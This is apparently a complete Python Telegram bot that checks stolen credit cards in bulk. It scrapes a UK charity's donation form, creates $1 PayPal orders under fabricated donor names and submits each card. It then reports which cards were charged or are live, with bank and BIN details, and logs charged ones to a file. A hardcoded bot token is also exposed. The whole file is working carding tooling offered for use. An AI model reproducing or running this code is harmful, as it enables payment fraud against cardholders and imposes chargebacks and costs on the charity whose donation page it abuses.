import requests,re, base64, json, time, random, os, threading
from user_agent import generate_user_agent
from flask import Flask

# Flask setup for keeping the bot alive
app = Flask(__name__)
@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

BOT_TOKEN = "8348073002:AAGg4-aANbeeWVwxKbd5eJTvqw6gWP8vRxw"
active_scans = {}

def get_bin_info(cc_num):
    bin_num = cc_num[:6]
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=8)
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            type_ = data.get('type', 'UNKNOWN').upper()
            brand = data.get('brand', 'UNKNOWN').upper()
            bank = data.get('bank', {}).get('name', 'UNKNOWN').upper()
            country = data.get('country', {}).get('name', 'UNKNOWN').upper()
            emoji = data.get('country', {}).get('emoji', 'ğŸ³ï¸')
            currency = data.get('country', {}).get('currency', 'UNK')
            return {
                "info": f"{scheme} - {type_} - {brand}",
                "bank": bank,
                "country": f"{country} {emoji} - [{currency}]"
            }
    except:
        pass
    return {"info": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN"}

def generate_fake_data():
    first = random.choice(["James", "Emma", "Michael", "Sophia", "William"])
    last  = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
    email = f"{first.lower()}{random.randint(100,9999)}@gmail.com"
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email}

def look(cc_line):
    try:
        parts = [x.strip() for x in cc_line.split("|")]
        if len(parts) < 4: return "INVALID"
        number, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
        month = month.zfill(2)
        year = year[2:] if len(year) == 4 else year
    except: return "INVALID"

    fake = generate_fake_data()
    s = requests.Session()
    user = generate_user_agent()
    
    try:
        resp = s.get("https://stockportmecfs.co.uk/donate-now/", headers={'User-Agent': user}, timeout=15)
        text = resp.text
        form_hash = re.search(r'name="give-form-hash"\s+value="(.*?)"', text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', text).group(1)
        form_id = re.search(r'name="give-form-id"\s+value="(.*?)"', text).group(1)
        enc_token = re.search(r'"data-client-token":"(.*?)"', text).group(1)
        access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token).decode('utf-8')).group(1)
        payload_create = {
            'give-form-id-prefix': form_prefix, 'give-form-id': form_id, 'give-form-hash': form_hash,
            'give-amount': "1.00", 'payment-mode': 'paypal-commerce', 'give_first': fake["first_name"],
            'give_last': fake["last_name"], 'give_email': fake["email"], 'give-gateway': 'paypal-commerce'
        }
        resp_create = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order", 
                             data=payload_create, headers={'User-Agent': user}, timeout=15)
        order_id = resp_create.json()['data']['id']
        payload_confirm = {
            "payment_source": {"card": {"number": number, "expiry": f"20{year}-{month}", "security_code": cvc}}
        }
        s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source", 
               json=payload_confirm, headers={'Authorization': f"Bearer {access_token}", 'Content-Type': 'application/json'}, timeout=15)
        resp_approve = s.post(f"https://stockportmecfs.co.uk/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}", 
                              data=payload_create, headers={'User-Agent': user}, timeout=15)
        
        res_text = resp_approve.text.lower()
        if any(x in res_text for x in ['thank', 'thanks', 'true']): return "CHARGED"
        if 'insufficient_funds' in res_text: return "INSUFFICIENT_FUNDS"
        return "DECLINED"
    except: return "ERROR"

def send_telegram(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except Exception as e:
        print(f"Send error: {e}")
        return None

def edit_telegram(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup: data["reply_markup"] = json.dumps(reply_markup)
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp
    except Exception as e:
        print(f"Edit error: {e}")
        return None

def check_single_card(chat_id, line):
    try:
        initial_msg = "<b>Gateway :</b> #PayPal_Custom ($1.00)\n<b>By :</b> ÙÙğ—§ÙÙğ—¡ÙÙğ—§ ."
        initial_buttons = {
            "inline_keyboard": [
                [{"text": f"ğŸ’³ {line}", "callback_data": "card"}],
                [{"text": "ğŸ“Š Status: CHECKING...", "callback_data": "status"}]
            ]
        }
        resp = send_telegram(chat_id, initial_msg, initial_buttons)        
        if not resp or resp.status_code != 200:
            send_telegram(chat_id, "<b>âŒ Error sending message</b>")
            return 
        message_id = resp.json().get("result", {}).get("message_id")
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        if result == "CHARGED":
            status_text = "Charge"
            status_emoji = "ğŸ”¥"
        elif result == "INSUFFICIENT_FUNDS":
            status_text = "Live "
            status_emoji = "âœ…"
        elif result == "DECLINED":
            status_text = "DECLINED"
            status_emoji = "âŒ"
        else:
            status_text = "ORDER_NOT_APPROVED"
            status_emoji = "âš ï¸"     
        result_msg = f"<b>Gateway :</b> #PayPal_Custom ($1.00)\n<b>By :</b> ÙÙğ—§ÙÙğ—¡ÙÙğ—§ ."
        result_buttons = {
            "inline_keyboard": [
                [{"text": f"ğŸ’³ {line}", "callback_data": "card"}],
                [{"text": f"ğŸ“Š Status: {status_text} {status_emoji}", "callback_data": "status"}]
            ]
        }
        edit_telegram(chat_id, message_id, result_msg, result_buttons)
        if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
            bin_data = get_bin_info(line.split('|')[0])
            status_text_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
            resp_emoji = "<b>ğ‚ğ¡ğšğ«ğ ğğ ğŸ”¥</b>" if result == "CHARGED" else "<b>ğ€ğ©ğ©ğ«ğ¨ğ¯ğğ âœ…</b>"
            
            msg = (
                f"<b>#PayPal_Charge ($1) [single] ğŸŒŸ</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ÏŸ] ğ‚ğšğ«ğ:</b> <code>{line}</code>\n"
                f"<b>[ÏŸ] ğ‘ğğ¬ğ©ğ¨ğ§ğ¬ğ:</b> {resp_emoji}\n"
                f"<b>[ÏŸ] ğ’ğ­ğšğ­ğ®ğ¬:</b> {status_text_full}\n"
                f"<b>[ÏŸ] ğ“ğšğ¤ğğ§:</b> <b>{elapsed:.2f} ğ’.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ÏŸ] ğˆğ§ğŸğ¨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ÏŸ] ğğšğ§ğ¤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ÏŸ] ğ‚ğ¨ğ®ğ§Ï„ğ«ğ²:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[âŒ¥] ğ“ğ¢ğ¦ğ:</b> <b>{elapsed:.2f} ğ’ğğœ.</b>\n"
                f"<b>[â‡] ğ‘ğğª ğğ²:</b> <b>VIP</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[âŒ¤] ğƒğğ¯ ğ›ğ²:</b> <b>ğ—§ÙÙğ—¡ÙÙğ—§ - ğŸ€</b>"
            )
            send_telegram(chat_id, msg)
            
            if result == "CHARGED":
                with open(f"charged_{chat_id}.txt", "a") as f:
                    f.write(line + "\n")
    except Exception as e:
        print(f"Check single card error: {e}")
        send_telegram(chat_id, f"<b>âŒ Error:</b> {str(e)}")

def start_checker(chat_id, combo_lines, gateway_name, initial_message_id):
    active_scans[chat_id]["stop"] = False
    active_scans[chat_id]["stats"] = {
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "total": len(combo_lines),
        "current": 0
    }
    active_scans[chat_id]["message_id"] = initial_message_id
    for idx, line in enumerate(combo_lines):
        if active_scans.get(chat_id, {}).get("stop"):
            final_text = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> ğ—§ÙÙğ—¡ÙÙğ—§"
            final_buttons = {
                "inline_keyboard": [
                    [{"text": "ğŸ›‘ Scan Stopped", "callback_data": "stopped"}]
                ]
            }
            edit_telegram(chat_id, initial_message_id, final_text, final_buttons)
            break     
        start_time = time.time()
        result = look(line)
        elapsed = time.time() - start_time
        stats = active_scans[chat_id]["stats"]
        stats["current"] = idx + 1    
        if result == "CHARGED":
            stats["charged"] += 1
            with open(f"charged_{chat_id}.txt", "a") as f: f.write(line + "\n")
        elif result == "INSUFFICIENT_FUNDS":
            stats["approved"] += 1
        else:
            stats["declined"] += 1
        status_msg = f"<b>Gateway:</b> {gateway_name}\n<b>By:</b> ğ—§ÙÙğ—¡ÙÙğ—§"
        if result == "CHARGED":
            status_text = "CHARGED"
        elif result == "INSUFFICIENT_FUNDS":
            status_text = "APPROVED"
        elif result == "DECLINED":
            status_text = "DECLINED"
        else:
            status_text = "ORDER_NOT_APPROVED"  
        buttons = {
            "inline_keyboard": [
                [{"text": f"ğŸ’³ {line}", "callback_data": "card"}],
                [{"text": f"ğŸ“Š Status: {status_text}", "callback_data": "status"}],
                [
                    {"text": f"ğŸ’° Charged âœ [ {stats['charged']} ]", "callback_data": "charged"},
                    {"text": f"âœ… Approved âœ [ {stats['approved']} ]", "callback_data": "approved"}
                ],
                [
                    {"text": f"âŒ Declined âœ [ {stats['declined']} ]", "callback_data": "declined"},
                    {"text": f"ğŸ“‚ Cards âœ [ {stats['current']}/{stats['total']} ]", "callback_data": "cards"}
                ],
                [{"text": "ğŸ›‘ STOP", "callback_data": f"stop_{chat_id}"}]
            ]
        }        
        edit_telegram(chat_id, initial_message_id, status_msg, buttons)    
        if result in ["CHARGED", "INSUFFICIENT_FUNDS"]:
            bin_data = get_bin_info(line.split('|')[0])
            status_text_full = "<b>Charged - $1 (Refund)!</b>" if result == "CHARGED" else "<b>Approved - INSUFFICIENT_FUNDS!</b>"
            resp_emoji = "<b>ğ‚ğ¡ğšğ«ğ ğğ ğŸ”¥</b>" if result == "CHARGED" else "<b>ğ€ğ©ğ©ğ«ğ¨ğ¯ğğ âœ…</b>"    
            msg = (
                f"<b>#PayPal_Charge ($1) [mass] ğŸŒŸ</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ÏŸ] ğ‚ğšğ«ğ:</b> <code>{line}</code>\n"
                f"<b>[ÏŸ] ğ‘ğğ¬ğ©ğ¨ğ§ğ¬ğ:</b> {resp_emoji}\n"
                f"<b>[ÏŸ] ğ’ğ­ğšğ­ğ®ğ¬:</b> {status_text_full}\n"
                f"<b>[ÏŸ] ğ“ğšğ¤ğğ§:</b> <b>{elapsed:.2f} ğ’.</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[ÏŸ] ğˆğ§ğŸğ¨:</b> <b>{bin_data['info']}</b>\n"
                f"<b>[ÏŸ] ğğšğ§ğ¤:</b> <b>{bin_data['bank']}</b>\n"
                f"<b>[ÏŸ] ğ‚ğ¨ğ®ğ§Ï„ğ«ğ²:</b> <b>{bin_data['country']}</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[âŒ¥] ğ“ğ¢ğ¦ğ:</b> <b>{elapsed:.2f} ğ’ğğœ.</b>\n"
                f"<b>[â‡] ğ‘ğğª ğğ²:</b> <b>VIP</b>\n"
                f"<b>- - - - - - - - - - - - - - - - - - - - - -</b>\n"
                f"<b>[âŒ¤] ğƒğğ¯ ğ›ğ²:</b> <b>ğ—§ÙÙğ—¡ÙÙğ—§ - ğŸ€</b>"
            )
            send_telegram(chat_id, msg)
        time.sleep(1)
    if chat_id in active_scans:
        del active_scans[chat_id]

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"timeout": 10, "offset": offset}
    try:
        resp = requests.get(url, params=params, timeout=15)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except:
        pass
    return []

def bot_loop():
    print("Bot started...")
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                offset = update["update_id"] + 1
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg["chat"]["id"]
                    text = msg.get("text", "")
                    
                    if text.startswith("/start"):
                        send_telegram(chat_id, "<b>Welcome to PayPal Custom Checker!</b>\nSend your combo to start.")
                    
                    elif re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', text):
                        threading.Thread(target=check_single_card, args=(chat_id, text)).start()
                    
                    elif "document" in msg:
                        doc = msg["document"]
                        file_id = doc["file_id"]
                        file_name = doc["file_name"]
                        if file_name.endswith(".txt"):
                            file_info = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}").json()
                            file_path = file_info["result"]["file_path"]
                            content = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/file/bot{BOT_TOKEN}/{file_path}").text
                            lines = [l.strip() for l in content.split("\n") if re.match(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', l.strip())]
                            if lines:
                                initial_msg = "<b>Gateway:</b> #PayPal_Custom ($1.00)\n<b>By:</b> ğ—§ÙÙğ—¡ÙÙğ—§"
                                initial_buttons = {
                                    "inline_keyboard": [
                                        [{"text": "ğŸ“Š Status: STARTING...", "callback_data": "starting"}]
                                    ]
                                }
                                resp = send_telegram(chat_id, initial_msg, initial_buttons)
                                if resp and resp.status_code == 200:
                                    msg_id = resp.json()["result"]["message_id"]
                                    active_scans[chat_id] = {"stop": False}
                                    threading.Thread(target=start_checker, args=(chat_id, lines, "#PayPal_Custom", msg_id)).start()
                            else:
                                send_telegram(chat_id, "<b>âŒ No valid cards found in file.</b>")
                
                elif "callback_query" in update:
                    cb = update["callback_query"]
                    chat_id = cb["message"]["chat"]["id"]
                    data = cb["data"]
                    if data.startswith("stop_"):
                        target_chat = int(data.split("_")[1])
                        if target_chat in active_scans:
                            active_scans[target_chat]["stop"] = True
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={"callback_query_id": cb["id"]})
        except Exception as e:
            print(f"Loop error: {e}")
        time.sleep(1)

if __name__ == "__main__":
    # Start Flask in a separate thread
    threading.Thread(target=run_flask).start()
    # Start Bot loop
    bot_loop()
